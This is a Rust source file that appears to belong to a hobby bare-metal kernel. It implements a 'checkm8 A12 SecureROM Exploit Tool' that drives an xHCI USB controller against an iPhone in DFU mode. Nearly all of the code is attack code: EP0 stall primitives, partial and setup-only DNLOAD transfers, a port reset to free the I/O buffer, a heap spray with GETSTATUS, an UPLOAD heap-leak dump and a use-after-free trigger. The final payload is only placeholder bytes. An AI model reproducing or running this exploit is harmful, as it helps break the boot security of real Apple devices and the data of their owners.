
















use alloc::string::String;
use alloc::vec::Vec;
use alloc::format;
use core::ptr;
use core::sync::atomic::Ordering;

use super::xhci::{
    self, Trb, An, Qw, Qx, Kz, Jh,
    wk, Ao, Ah,
    
    ZC_, AKZ_, ZD_, ZB_,
    
    DH_, FL_,
    
    AII_, PX_, PY_, LP_, BFM_,
    BFN_,
};


const AMN_: u16 = 0x05AC;
const ASK_: u16 = 0x1227;


const IO_: u8 = 1;
const BUN_: u8 = 2;
const BUK_: u8 = 3;
const BUJ_: u8 = 4;
const DMU_: u8 = 5;
const BUI_: u8 = 6;


const ZH_: u8 = 0x00;
const ME_: u8 = 0x80;
const MG_: u8 = 0x00;
const BKH_: u8 = 0x20;
const MF_: u8 = 0x00;
const RE_: u8 = 0x01;


const FR_: u8 = BKH_ | RE_; 
const ASJ_: u8 = ME_ | BKH_ | RE_; 


const RF_: u8 = 0x06;


const BUM_: u8 = 2;
const DMW_: u8 = 3;
const DMV_: u8 = 5;
const DMY_: u8 = 6;
const DMX_: u8 = 7;
const BUL_: u8 = 10;


const DCG_: u32 = 15;


const NB_: u8 = 1;
const APX_: u8 = 13;
const DIE_: u8 = 6;
const DID_: u8 = 3;
const DIF_: u8 = 26;
const DIG_: u8 = 27;






fn lvv() -> Option<u8> {
    let devices = xhci::adz();
    for s in &devices {
        if s.vendor_id == AMN_ && s.product_id == ASK_ {
            return Some(s.slot_id);
        }
    }
    None
}


fn lvu() -> Option<u8> {
    let devices = xhci::adz();
    for s in &devices {
        if s.vendor_id == AMN_ && s.product_id == ASK_ {
            return Some(s.port);
        }
    }
    None
}



fn cmq(
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    w_length: u16,
    hab: u8, 
) -> Trb {
    let setup_data = (bm_request_type as u64)
        | ((b_request as u64) << 8)
        | ((w_value as u64) << 16)
        | ((w_index as u64) << 32)
        | ((w_length as u64) << 48);

    Trb {
        parameter: setup_data,
        status: 8, 
        control: (ZC_ << 10) | (1 << 6) | ((hab as u32) << 16), 
    }
}


fn etr(hg: u64, length: u32, direction_in: bool) -> Trb {
    Trb {
        parameter: hg,
        status: length,
        control: (AKZ_ << 10) | if direction_in { 1 << 16 } else { 0 },
    }
}


fn ett(direction_in: bool) -> Trb {
    Trb {
        parameter: 0,
        status: 0,
        control: (ZD_ << 10) | FL_ | if direction_in { 1 << 16 } else { 0 },
    }
}






fn qfc(slot_id: u8, nq: Trb) -> bool {
    let mut rings = super::xhci::CD_.lock();
    let acp = match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
        Some(r) => r,
        None => return false,
    };
    acp.ep0.enqueue_trb(nq);
    true
}




fn cpk(doorbell_base: u64, slot_id: u8) {
    unsafe {
        let fu = (doorbell_base + (slot_id as u64) * 4) as *mut u32;
        ptr::write_volatile(fu, 1); 
    }
}



fn bir(ar: &mut An, max_iters: u32) -> Option<(u8, u32, u8)> {
    for _ in 0..max_iters {
        let idx = ar.event_dequeue;
        let nq = ar.event_ring[idx];

        let phase = (nq.control & DH_) != 0;
        if phase == ar.event_cycle {
            ar.event_dequeue += 1;
            if ar.event_dequeue >= 256 {
                ar.event_dequeue = 0;
                ar.event_cycle = !ar.event_cycle;
            }

            let dou = ar.event_ring_phys + (ar.event_dequeue as u64 * 16);
            let clh = (ar.runtime_base + 0x20) as *mut Kz;
            unsafe {
                (*clh).erdp = dou | (1 << 3); 
            }

            let cer = (nq.control >> 10) & 0x3F;
            let byh = ((nq.status >> 24) & 0xFF) as u8;

            if cer == 32 { 
                let gzx = nq.status & 0xFFFFFF;
                let fuw = ((nq.control >> 16) & 0x1F) as u8;
                return Some((byh, gzx, fuw));
            }
            if cer == 33 { 
                let slot_id = ((nq.control >> 24) & 0xFF) as u8;
                return Some((byh, 0, slot_id));
            }
            
            continue;
        }
        core::hint::spin_loop();
    }
    None
}


fn lhk(ar: &mut An) {
    for _ in 0..1000 {
        if bir(ar, 100).is_none() {
            break;
        }
    }
}





fn dkk(ft: u8) -> &'static str {
    match ft {
        1 => "SUCCESS",
        2 => "DATA_BUFFER_ERROR",
        3 => "BABBLE",
        4 => "USB_TRANSACTION_ERROR",
        5 => "TRB_ERROR",
        6 => "STALL",
        7 => "RESOURCE_ERROR",
        8 => "BANDWIDTH_ERROR",
        9 => "NO_SLOTS",
        10 => "INVALID_STREAM_TYPE",
        11 => "SLOT_NOT_ENABLED",
        12 => "EP_NOT_ENABLED",
        13 => "SHORT_PACKET",
        14 => "RING_UNDERRUN",
        15 => "RING_OVERRUN",
        16 => "VF_EVENT_RING_FULL",
        17 => "PARAMETER_ERROR",
        21 => "CONTEXT_STATE_ERROR",
        26 => "STOPPED",
        27 => "STOPPED_LENGTH_INVALID",
        _ => "UNKNOWN",
    }
}






fn dhm() -> Option<(u64, u64)> {
    let phys = crate::memory::frame::aan()?;
    let virt = wk(phys);
    Some((phys, virt))
}


fn cju(phys: u64) {
    crate::memory::frame::vk(phys);
}



fn iaj(
    ar: &mut An,
    slot_id: u8,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    w_length: u16,
    hg: u64,
) -> Option<u32> {
    
    {
        let mut rings = super::xhci::CD_.lock();
        let pb = rings.get_mut(slot_id as usize)?.as_mut()?;

        let pk = cmq(bm_request_type, b_request, w_value, w_index, w_length, 3);
        pb.ep0.enqueue_trb(pk);

        if w_length > 0 {
            let data = etr(hg, w_length as u32, true);
            pb.ep0.enqueue_trb(data);
        }

        let status = ett(false); 
        pb.ep0.enqueue_trb(status);
    }

    cpk(ar.doorbell_base, slot_id);

    if let Some((ft, len, _)) = bir(ar, 5_000_000) {
        if ft == NB_ || ft == APX_ {
            return Some(len);
        }
    }
    None
}


fn maa(
    ar: &mut An,
    slot_id: u8,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    w_length: u16,
    hg: u64,
) -> Option<u32> {
    {
        let mut rings = super::xhci::CD_.lock();
        let pb = rings.get_mut(slot_id as usize)?.as_mut()?;

        let hab = if w_length > 0 { 2 } else { 0 }; 
        let pk = cmq(bm_request_type, b_request, w_value, w_index, w_length, hab);
        pb.ep0.enqueue_trb(pk);

        if w_length > 0 {
            let data = etr(hg, w_length as u32, false);
            pb.ep0.enqueue_trb(data);
        }

        let status = ett(true); 
        pb.ep0.enqueue_trb(status);
    }

    cpk(ar.doorbell_base, slot_id);

    if let Some((ft, len, _)) = bir(ar, 5_000_000) {
        if ft == NB_ || ft == APX_ {
            return Some(len);
        }
    }
    None
}


fn bbb(ar: &mut An, slot_id: u8) -> Option<(u8, u8)> {
    let (hg, kt) = dhm()?;
    let result = iaj(ar, slot_id, ASJ_, BUK_, 0, 0, 6, hg);
    let ret = if result.is_some() {
        let fhw = unsafe { ptr::read_volatile(kt as *const u8) };
        let efv = unsafe { ptr::read_volatile((kt + 4) as *const u8) };
        Some((fhw, efv))
    } else {
        None
    };
    cju(hg);
    ret
}


fn fsa(ar: &mut An, slot_id: u8) -> bool {
    {
        let mut rings = super::xhci::CD_.lock();
        let pb = match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
            Some(r) => r,
            None => return false,
        };
        let pk = cmq(FR_, BUI_, 0, 0, 0, 0);
        pb.ep0.enqueue_trb(pk);
        let status = ett(true); 
        pb.ep0.enqueue_trb(status);
    }
    cpk(ar.doorbell_base, slot_id);
    bir(ar, 2_000_000).map(|(ft, _, _)| ft == NB_).unwrap_or(false)
}


fn leh(ar: &mut An, slot_id: u8) -> bool {
    {
        let mut rings = super::xhci::CD_.lock();
        let pb = match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
            Some(r) => r,
            None => return false,
        };
        let pk = cmq(FR_, BUJ_, 0, 0, 0, 0);
        pb.ep0.enqueue_trb(pk);
        let status = ett(true);
        pb.ep0.enqueue_trb(status);
    }
    cpk(ar.doorbell_base, slot_id);
    bir(ar, 2_000_000).map(|(ft, _, _)| ft == NB_).unwrap_or(false)
}


fn cwl(ar: &mut An, slot_id: u8, data: &[u8]) -> Option<u8> {
    let (hg, kt) = dhm()?;
    let len = data.len().min(4096) as u16;
    
    unsafe {
        ptr::copy_nonoverlapping(data.as_ptr(), kt as *mut u8, len as usize);
    }
    let result = maa(ar, slot_id, FR_, IO_, 0, 0, len, hg);
    cju(hg);

    
    result.map(|_| NB_)
}


fn hsa(ar: &mut An, slot_id: u8, buf: &mut [u8]) -> Option<u32> {
    let (hg, kt) = dhm()?;
    let len = buf.len().min(4096) as u16;
    let result = iaj(ar, slot_id, ASJ_, BUN_, 0, 0, len, hg);
    if let Some(transferred) = result {
        let mb = (transferred as usize).min(buf.len());
        unsafe {
            ptr::copy_nonoverlapping(kt as *const u8, buf.as_mut_ptr(), mb);
        }
    }
    cju(hg);
    result
}


fn bdj(ar: &mut An, slot_id: u8) -> bool {
    for _ in 0..20 {
        if let Some((_, state)) = bbb(ar, slot_id) {
            if state == BUM_ {
                return true;
            }
            if state == BUL_ {
                leh(ar, slot_id);
                continue;
            }
            fsa(ar, slot_id);
        } else {
            return false; 
        }
        
        for _ in 0..100_000 { core::hint::spin_loop(); }
    }
    false
}










fn dzf(
    ar: &mut An,
    slot_id: u8,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    w_length: u16,
) -> Option<u8> {
    {
        let mut rings = super::xhci::CD_.lock();
        let pb = match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
            Some(r) => r,
            None => return None,
        };

        
        
        
        let mut pk = cmq(bm_request_type, b_request, w_value, w_index, w_length, 0);
        pk.control |= FL_; 
        pb.ep0.enqueue_trb(pk);
    }

    cpk(ar.doorbell_base, slot_id);

    
    bir(ar, 2_000_000).map(|(ft, _, _)| ft)
}





fn oqm(
    ar: &mut An,
    slot_id: u8,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    w_length: u16,      
    actual_data: &[u8], 
) -> Option<u8> {
    let (hg, kt) = dhm()?;
    let cfr = actual_data.len().min(4096);
    unsafe {
        ptr::copy_nonoverlapping(actual_data.as_ptr(), kt as *mut u8, cfr);
    }

    {
        let mut rings = super::xhci::CD_.lock();
        let pb = match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
            Some(r) => r,
            None => { cju(hg); return None; },
        };

        
        let pk = cmq(bm_request_type, b_request, w_value, w_index, w_length, 2);
        pb.ep0.enqueue_trb(pk);

        
        
        let mut data = etr(hg, cfr as u32, false); 
        data.control |= FL_;
        pb.ep0.enqueue_trb(data);

        
    }

    cpk(ar.doorbell_base, slot_id);

    let result = bir(ar, 5_000_000).map(|(ft, _, _)| ft);
    cju(hg);
    result
}



fn oqe(
    ar: &mut An,
    slot_id: u8,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    data: &[u8],
) -> Option<u8> {
    let (hg, kt) = dhm()?;
    let len = data.len().min(4096);
    unsafe {
        ptr::copy_nonoverlapping(data.as_ptr(), kt as *mut u8, len);
    }

    {
        let mut rings = super::xhci::CD_.lock();
        let pb = match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
            Some(r) => r,
            None => { cju(hg); return None; },
        };

        let pk = cmq(bm_request_type, b_request, w_value, w_index, len as u16, 2);
        pb.ep0.enqueue_trb(pk);

        let mut ejx = etr(hg, len as u32, false);
        ejx.control |= FL_;
        pb.ep0.enqueue_trb(ejx);
        
    }

    cpk(ar.doorbell_base, slot_id);

    let result = bir(ar, 5_000_000).map(|(ft, _, _)| ft);
    cju(hg);
    result
}





fn eai(ar: &mut An, slot_id: u8) -> Option<u8> {
    dzf(
        ar, slot_id,
        ME_ | MG_ | MF_, 
        RF_,                             
        0x0304,  
        0x040A,  
        0xC1,    
    )
}



fn oxn(ar: &mut An, slot_id: u8) -> Option<u8> {
    let nq = Trb {
        parameter: 0,
        status: 0,
        
        control: (DCG_ << 10) | ((slot_id as u32) << 24) | (1 << 16),
    };

    
    super::xhci::eap(ar, nq);

    
    bir(ar, 2_000_000).map(|(ft, _, _)| ft)
}



fn gns(ar: &mut An, port_num: u8) -> bool {
    let buz = ar.base_virt
        + (unsafe { &*ar.cap_regs }.caplength as u64)
        + 0x400;

    let dws = (buz + ((port_num as u64 - 1) * 16)) as *mut Qx;
    let port = unsafe { &mut *dws };

    let portsc = port.portsc;

    
    port.portsc = (portsc & !PX_) | PY_;

    
    for _ in 0..200 {
        for _ in 0..200_000 { core::hint::spin_loop(); }
        let cne = port.portsc;
        if (cne & PY_) == 0 && (cne & LP_) != 0 {
            
            port.portsc = cne | LP_;
            return true;
        }
    }
    false
}


fn ago(ar: &mut An, port_num: u8) -> bool {
    let buz = ar.base_virt
        + (unsafe { &*ar.cap_regs }.caplength as u64)
        + 0x400;

    let dws = (buz + ((port_num as u64 - 1) * 16)) as *mut Qx;
    let portsc = unsafe { (*dws).portsc };
    (portsc & AII_) != 0
}


fn aas(us: u32) {
    
    let acd = us as u64 * 400;
    for _ in 0..acd {
        core::hint::spin_loop();
    }
}


fn aar(dh: u32) {
    aas(dh * 1000);
}






pub fn ojb(args: &str) -> String {
    let mut output = String::new();

    output.push_str("=== checkm8 A12 SecureROM Exploit Tool ===\n");
    output.push_str("Target: Apple A12 (T8020) DFU mode\n");
    output.push_str("Method: Bare-metal xHCI TRB manipulation\n\n");

    
    if !Ah.load(Ordering::Relaxed) {
        output.push_str("ERROR: xHCI controller not initialized\n");
        output.push_str("  Run 'lsusb' first to verify USB is working\n");
        return output;
    }

    
    let slot_id = match lvv() {
        Some(j) => j,
        None => {
            output.push_str("ERROR: No Apple DFU device found (VID=05AC PID=1227)\n");
            output.push_str("  Put your iPhone in DFU mode and connect via USB\n");
            let devices = xhci::adz();
            if devices.is_empty() {
                output.push_str("  No USB devices detected at all\n");
            } else {
                output.push_str("  Connected USB devices:\n");
                for d in &devices {
                    output.push_str(&format!("    Slot {}: VID={:04X} PID={:04X} {}\n",
                        d.slot_id, d.vendor_id, d.product_id, d.product));
                }
            }
            return output;
        }
    };

    let port_num = lvu().unwrap_or(0);
    output.push_str(&format!("Found DFU device: slot={}, port={}\n\n", slot_id, port_num));

    
    match args.trim() {
        "status" | "s" => kry(&mut output, slot_id, port_num),
        "stall" | "st" => ksq(&mut output, slot_id, port_num),
        "partial" | "p" => ksp(&mut output, slot_id, port_num),
        "uaf" | "u" => ksr(&mut output, slot_id, port_num),
        "exploit" | "e" | "go" => knz(&mut output, slot_id, port_num),
        "help" | "h" | "" => {
            output.push_str("Subcommands:\n");
            output.push_str("  status   — Query DFU device state\n");
            output.push_str("  stall    — Test EP0 stall primitives (SETUP-only, IN stall)\n");
            output.push_str("  partial  — Test partial DATA transfers\n");
            output.push_str("  uaf      — Test Use-After-Free with stall + spray\n");
            output.push_str("  exploit  — Run full checkm8 exploit sequence\n");
            output.push_str("  help     — This help\n");
        }
        other => {
            output.push_str(&format!("Unknown subcommand: '{}'. Try 'checkm8 help'\n", other));
        }
    }

    output
}





fn kry(output: &mut String, slot_id: u8, port_num: u8) {
    output.push_str("--- DFU Device Status ---\n");

    let mut ctrl = Ao.lock();
    let ar = match ctrl.as_mut() {
        Some(c) => c,
        None => { output.push_str("ERROR: xHCI controller not available\n"); return; }
    };

    let bfn = ago(ar, port_num);
    output.push_str(&format!("  Port {}: connected={}\n", port_num, bfn));

    if let Some((fhw, efv)) = bbb(ar, slot_id) {
        let state_name = match efv {
            0 => "appIDLE",
            1 => "appDETACH",
            2 => "dfuIDLE",
            3 => "dfuDNLOAD-SYNC",
            4 => "dfuDNBUSY",
            5 => "dfuDNLOAD-IDLE",
            6 => "dfuMANIFEST-SYNC",
            7 => "dfuMANIFEST",
            8 => "dfuMANIFEST-WAIT-RESET",
            9 => "dfuUPLOAD-IDLE",
            10 => "dfuERROR",
            _ => "UNKNOWN",
        };
        output.push_str(&format!("  DFU status: bStatus={}, bState={} ({})\n",
            fhw, efv, state_name));
    } else {
        output.push_str("  DFU GETSTATUS failed (device not responding)\n");
    }
}





fn ksq(output: &mut String, slot_id: u8, port_num: u8) {
    output.push_str("--- Test: EP0 Stall Primitives ---\n\n");

    let mut ctrl = Ao.lock();
    let ar = match ctrl.as_mut() {
        Some(c) => c,
        None => { output.push_str("ERROR: controller unavailable\n"); return; }
    };

    
    let ckv = bdj(ar, slot_id);
    output.push_str(&format!("Reset to IDLE: {}\n", ckv));

    
    output.push_str("\n[T1] SETUP-only DNLOAD (wLength=0x800, no DATA/STATUS):\n");
    {
        let ft = dzf(ar, slot_id, FR_, IO_, 0, 0, 0x800);
        output.push_str(&format!("  Completion: {:?} ({})\n",
            ft, ft.map(dkk).unwrap_or("timeout")));

        if let Some((_, state)) = bbb(ar, slot_id) {
            output.push_str(&format!("  State after: {}\n", state));
        } else {
            output.push_str("  Device not responding after setup-only\n");
        }
        let alive = ago(ar, port_num);
        output.push_str(&format!("  Connected: {}\n", alive));
    }

    
    aar(100);
    bdj(ar, slot_id);

    
    output.push_str("\n[T2] IN stall (GET_DESCRIPTOR setup-only, no DATA IN TRB):\n");
    {
        let ft = eai(ar, slot_id);
        output.push_str(&format!("  Completion: {:?} ({})\n",
            ft, ft.map(dkk).unwrap_or("timeout")));

        if let Some((_, state)) = bbb(ar, slot_id) {
            output.push_str(&format!("  State after: {}\n", state));
        } else {
            output.push_str("  Device not responding after IN stall\n");
        }
    }

    aar(100);
    bdj(ar, slot_id);

    
    output.push_str("\n[T3] DNLOAD + DATA (0x800 bytes) but NO STATUS:\n");
    {
        let data = [0xAA_u8; 0x800];
        let ft = oqe(ar, slot_id, FR_, IO_, 0, 0, &data);
        output.push_str(&format!("  Completion: {:?} ({})\n",
            ft, ft.map(dkk).unwrap_or("timeout")));

        aar(50);
        if let Some((_, state)) = bbb(ar, slot_id) {
            output.push_str(&format!("  State after: {}\n", state));
        } else {
            output.push_str("  Device not responding\n");
        }
    }

    aar(100);
    bdj(ar, slot_id);

    
    output.push_str("\n[T4] SETUP-only DNLOAD → Stop Endpoint → check:\n");
    {
        let ft = dzf(ar, slot_id, FR_, IO_, 0, 0, 0x800);
        output.push_str(&format!("  Setup completion: {:?}\n", ft));

        let jix = oxn(ar, slot_id);
        output.push_str(&format!("  Stop EP: {:?} ({})\n",
            jix, jix.map(dkk).unwrap_or("timeout")));

        if let Some((_, state)) = bbb(ar, slot_id) {
            output.push_str(&format!("  State: {}\n", state));
        } else {
            output.push_str("  Not responding\n");
        }
    }

    aar(100);

    
    output.push_str("\n[T5] Multiple IN stalls (×5):\n");
    bdj(ar, slot_id);
    for i in 0..5 {
        let ft = eai(ar, slot_id);
        let alive = ago(ar, port_num);
        output.push_str(&format!("  Stall #{}: cc={:?}, alive={}\n", i, ft, alive));
        if !alive {
            output.push_str("  Device disconnected!\n");
            break;
        }
    }
}





fn ksp(output: &mut String, slot_id: u8, port_num: u8) {
    output.push_str("--- Test: Partial DATA Transfers ---\n\n");

    let mut ctrl = Ao.lock();
    let ar = match ctrl.as_mut() {
        Some(c) => c,
        None => { output.push_str("ERROR: controller unavailable\n"); return; }
    };

    bdj(ar, slot_id);

    
    let otn: &[usize] = &[0, 1, 64, 128, 512, 1024, 2047];

    for &cti in otn {
        output.push_str(&format!("\n[wLength=0x800, actual={}B]:\n", cti));
        bdj(ar, slot_id);

        let data = alloc::vec![0xBB_u8; cti];
        let ft = oqm(
            ar, slot_id,
            FR_, IO_, 0, 0,
            0x800,  
            &data,  
        );
        output.push_str(&format!("  Completion: {:?} ({})\n",
            ft, ft.map(dkk).unwrap_or("timeout")));

        aar(50);
        let alive = ago(ar, port_num);
        output.push_str(&format!("  Connected: {}\n", alive));

        if alive {
            if let Some((_, state)) = bbb(ar, slot_id) {
                output.push_str(&format!("  State: {}\n", state));
            }
        } else {
            output.push_str("  Device disconnected! Waiting...\n");
            
            for bqb in 0..60 {
                aar(1000);
                if ago(ar, port_num) {
                    output.push_str(&format!("  Reconnected after {}s\n", bqb + 1));
                    break;
                }
            }
        }
    }
}





fn ksr(output: &mut String, slot_id: u8, port_num: u8) {
    output.push_str("--- Test: UAF with EP0 Stall ---\n");
    output.push_str("Sequence: stall → DNLOAD → ABORT → spray → trigger\n\n");

    let mut ctrl = Ao.lock();
    let ar = match ctrl.as_mut() {
        Some(c) => c,
        None => { output.push_str("ERROR: controller unavailable\n"); return; }
    };

    
    for leak_rounds in &[1u32, 5, 10] {
        output.push_str(&format!("\n[Flow A: {} leak rounds]\n", leak_rounds));
        bdj(ar, slot_id);

        
        let ovx = eai(ar, slot_id);
        output.push_str(&format!("  1. IN stall: cc={:?}\n", ovx));
        if !ago(ar, port_num) {
            output.push_str("  CRASHED at stall\n");
            continue;
        }

        
        let mut cmc = 0u32;
        for i in 0..*leak_rounds {
            let fsp = [0u8; 0x800];
            let qdf = cwl(ar, slot_id, &fsp);
            if !ago(ar, port_num) {
                output.push_str(&format!("  2. CRASHED at leak round {}\n", i));
                break;
            }
            bbb(ar, slot_id);
            if !ago(ar, port_num) {
                output.push_str(&format!("  2. CRASHED at getstatus round {}\n", i));
                break;
            }
            cmc += 1;
        }
        output.push_str(&format!("  2. Leaked {}/{} rounds\n", cmc, leak_rounds));

        if !ago(ar, port_num) { continue; }

        
        output.push_str("  3. USB port reset...\n");
        let dxs = gns(ar, port_num);
        output.push_str(&format!("     Reset: {}\n", if dxs { "OK" } else { "FAILED" }));
        aar(500);

        if !ago(ar, port_num) {
            output.push_str("  Device gone after reset\n");
            continue;
        }

        
        if let Some((_, state)) = bbb(ar, slot_id) {
            output.push_str(&format!("  4. State after reset: {}\n", state));
        } else {
            output.push_str("  4. GETSTATUS failed\n");
        }

        
        output.push_str("  5. Spraying (GETSTATUS ×128)...\n");
        for _ in 0..128 {
            bbb(ar, slot_id);
        }

        
        let mut csf = [0u8; 0x800];
        if let Some(up_len) = hsa(ar, slot_id, &mut csf) {
            let dvg = csf.iter().take(up_len as usize).any(|&b| b != 0);
            output.push_str(&format!("  6. UPLOAD: {}B, nonzero={}\n", up_len, dvg));
            if dvg {
                output.push_str("  *** HEAP DATA LEAKED! ***\n");
                output.push_str("  First 64 bytes: ");
                for b in csf.iter().take(64) {
                    output.push_str(&format!("{:02x}", b));
                }
                output.push('\n');
            }
        } else {
            output.push_str("  6. UPLOAD failed\n");
        }

        
        output.push_str("  7. Trigger: DNLOAD→ABORT→DNLOAD...\n");
        bdj(ar, slot_id);
        let _ = cwl(ar, slot_id, &[0xAA; 0x800]);
        fsa(ar, slot_id);

        if !ago(ar, port_num) {
            output.push_str("  CRASHED at abort (io_buffer freed)\n");
            continue;
        }

        
        let result = cwl(ar, slot_id, &[0x55; 0x800]);
        if ago(ar, port_num) {
            output.push_str("  *** UAF SURVIVED! Device still alive! ***\n");
        } else {
            output.push_str("  UAF triggered crash (expected on A12)\n");
        }
    }

    
    output.push_str("\n\n[Flow B: Stall + Partial Data + Abort]\n");
    
    for _ in 0..30 {
        if ago(ar, port_num) { break; }
        aar(1000);
    }
    if !ago(ar, port_num) {
        output.push_str("  Device not reconnected after 30s\n");
        return;
    }

    bdj(ar, slot_id);

    
    let stall = eai(ar, slot_id);
    output.push_str(&format!("  1. IN stall: cc={:?}\n", stall));

    
    let ft = dzf(ar, slot_id, FR_, IO_, 0, 0, 0x800);
    output.push_str(&format!("  2. Setup-only DNLOAD: cc={:?}\n", ft));

    
    let dxs = gns(ar, port_num);
    output.push_str(&format!("  3. Port reset: {}\n", if dxs { "OK" } else { "FAIL" }));
    aar(500);

    if ago(ar, port_num) {
        if let Some((_, state)) = bbb(ar, slot_id) {
            output.push_str(&format!("  4. State: {}\n", state));
        }
    } else {
        output.push_str("  Device gone\n");
    }
}





fn knz(output: &mut String, slot_id: u8, port_num: u8) {
    output.push_str("--- Full checkm8 Exploit Sequence ---\n");
    output.push_str("⚠  This will attempt code execution on the A12 SecureROM.\n\n");

    let mut ctrl = Ao.lock();
    let ar = match ctrl.as_mut() {
        Some(c) => c,
        None => { output.push_str("ERROR: controller unavailable\n"); return; }
    };

    
    output.push_str("[Phase 1] Verify DFU state\n");
    if !bdj(ar, slot_id) {
        output.push_str("  FAILED: Cannot reach dfuIDLE\n");
        return;
    }
    output.push_str("  OK: dfuIDLE\n");

    
    output.push_str("\n[Phase 2] Stall EP0_IN (request accumulation)\n");

    
    let mut jif = 0;
    for i in 0..6 {
        let ft = eai(ar, slot_id);
        if !ago(ar, port_num) {
            output.push_str(&format!("  CRASHED at stall #{}\n", i));
            break;
        }
        jif += 1;
        output.push_str(&format!("  Stall #{}: cc={:?}\n", i, ft));
    }
    output.push_str(&format!("  Created {} stalls\n", jif));

    
    output.push_str("\n[Phase 3] DNLOAD to set ep0DataPhaseBuffer\n");
    let fsp = [0u8; 0x800];
    let ft = cwl(ar, slot_id, &fsp);
    output.push_str(&format!("  DNLOAD: {:?}\n", ft));

    if !ago(ar, port_num) {
        output.push_str("  CRASHED at DNLOAD\n");
        return;
    }

    
    output.push_str("\n[Phase 4] Setup-only incomplete DNLOAD\n");
    let ft = dzf(ar, slot_id, FR_, IO_, 0, 0, 0x800);
    output.push_str(&format!("  Setup-only: cc={:?}\n", ft));

    
    output.push_str("\n[Phase 5] USB port reset (free io_buffer)\n");
    let dxs = gns(ar, port_num);
    output.push_str(&format!("  Reset: {}\n", if dxs { "OK" } else { "FAIL" }));
    aar(500);

    if !ago(ar, port_num) {
        output.push_str("  Device left DFU after reset\n");
        return;
    }

    
    output.push_str("\n[Phase 6] Heap spray via GETSTATUS\n");
    let mut jhh = 0;
    for _ in 0..128 {
        if bbb(ar, slot_id).is_some() {
            jhh += 1;
        }
    }
    output.push_str(&format!("  GETSTATUS success: {}/128\n", jhh));

    
    output.push_str("\n[Phase 7] UPLOAD — heap data leak check\n");
    let mut csf = [0u8; 0x800];
    if let Some(up_len) = hsa(ar, slot_id, &mut csf) {
        let dvg = csf.iter().take(up_len as usize).any(|&b| b != 0);
        output.push_str(&format!("  UPLOAD: {}B, nonzero={}\n", up_len, dvg));
        if dvg {
            output.push_str("  *** HEAP DATA LEAKED ***\n  ");
            for b in csf.iter().take(128) {
                output.push_str(&format!("{:02x}", b));
            }
            output.push('\n');
        }
    } else {
        output.push_str("  UPLOAD failed\n");
    }

    
    output.push_str("\n[Phase 8] Trigger UAF (DNLOAD to freed io_buffer)\n");
    bdj(ar, slot_id);
    let _ = cwl(ar, slot_id, &[0xAA; 0x800]);
    fsa(ar, slot_id);

    if ago(ar, port_num) {
        
        
        let payload = [0x41u8; 0x800]; 
        let result = cwl(ar, slot_id, &payload);
        if ago(ar, port_num) {
            output.push_str("  *** UAF WRITE SURVIVED — EXPLOITATION IN PROGRESS ***\n");
            
        } else {
            output.push_str("  UAF triggered crash (expected — A12 double-abort)\n");
        }
    } else {
        output.push_str("  Device crashed at ABORT\n");
    }

    output.push_str("\n--- Exploit sequence complete ---\n");
}
